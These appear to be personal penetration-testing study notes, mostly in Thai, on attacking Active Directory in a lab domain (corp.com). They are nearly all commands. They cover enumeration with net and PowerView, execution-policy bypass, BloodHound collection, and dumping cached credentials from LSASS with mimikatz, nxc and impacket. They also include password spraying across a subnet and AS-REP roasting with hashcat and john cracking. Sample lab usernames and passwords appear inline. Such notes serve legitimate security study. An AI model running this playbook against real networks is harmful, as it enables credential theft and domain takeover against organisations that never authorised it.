[[Enumeration]]
```
# ตรวจสอบ user ภายใน local 
net user 

# ตรวจสอบ Group ใน Local 
net localgroup
net localgroup "Management Department"

# ตรวจสอบ Group ใน Domain ทั้งหมด 
net group /domain 

# ตรวจสอบ Member ที่อยู่ใน Group นี้ 
net group "Management Department" /domain

# ตรวจสอบ User ภายใน Domain  
net user /domain

# ตรยจสอบ รายละเอียของ User jen 
net user jen /domain 

# ตรวจสอบชื่อโดเมนด้วย .NET 
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
```

[[PowerView]]

```powershell
powershell -ep bypass 
. .\PowerView.ps1

# ตรวจสอบ Domain ที่สนใจด้วย PowerView หรือจะใช้ net group ก็ได้ผลเหมือนกัน
Get-Netgroup 
Get-DomainGroup -Name "Domain Admins" 
net group "Domain Admins" /domain 
```


AD ACL and ACE permission concept 
[[ACL&ACE]]
![[ACLandACE.png]]



https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll

https://www.thehacker.recipes/ad/movement/dacl/addmember

![[shapehound_collectionGP.png]]


[[bloodhound-python]] 
```bash
# รูปแบบคำสั่ง
bloodhound-python -u <user> -p <Pass> -d <domain> -v --zip -c ALL,LoggedOn -dc <DCname> -ns <IPofDC>

# ตัวอย่าง Command
bloodhound-python -u stephanie -p 'LegmanTeamBenzoin!!' -d corp.com -v --zip -c All,LoggedOn -dc dc1.corp.com -ns 192.168.160.70

```

[[Cached AD Credentials]]

ภายในเครื่องเป้าหมายบางเครื่องจะมีการเก็บข้อมูลของ Cache Credential ของ AD ไว้ ซึ่งเราสามารถใช้ Mimikatz สำหรับดึงค่า Credential ของผู้ใช้งานอื่นๆ ภายใต้ Memory บน lsass.exe ได้ 

```powershell 
powershell -ep bypass 
.\mimikatz.exe
privilege::debug
# dump lssas memory by mimikaz
sekurlsa::logonpasswords

```
![[dumpLSAonMem.png]]

[[KaliDumpCachedADCred]]
```bash
# หรือเราสามารถใช้ tools ภายใน kali ได้ เช่น nxc หรือ secretdump 
nxc smb 192.168.160.75  -u jeff -p 'HenchmanPutridBonbon11' --lsa 
impacket-secretdump corp/'jef:HenchmanPutridBonbon11'@192.168.160.75
```

[[PasswordSplay]]

```bash 
nxc smb 192.168.160.0/24 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

![[passSplay.png]]


[[AS-Rep Roasting]]

การจะโจมตีได้จะต้องมี 2 เงื่อนไข
1. ต้องสามารถติดต่อไปถึง AD ได้ 
2. ต้องมี User Credential สิทธิอะไรก็ได้ 
ผลลัพธ์ จะได้ข้อมูล Users คนอื่นๆ และค่า TGT Hash กลับมา และสามารถนำไป Crack ต่อได้ 

```
# ทดสอบโจมตีด้วย AS-Rep Roasting 
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete

# ตรวจสอบ Version ว่าเป็นอะไร โดยในที่นี้ใช้ mode 18200 
hashcat --help | grep -i "Kerberos"

# ทำการ Crack ค่า Hash ที่ได้มา 
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# กรณีเจอ Version อื่นๆ ให้ลองปรับ mode 
# Crack the hash with Hashcat 
# $krb5tgs$23$ 
$ hashcat -a 0 -m 13100 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --force --potfile-disable 

# $krb5tgs$18$ 
$ hashcat -a 0 -m 19700 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --force --potfile-disable 

# เราสามารถใช้ john ได้ และไม่จำเป็นต้องตรวจสอบ mode 
# Crack the hash with John the Ripper 
$ john hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

```


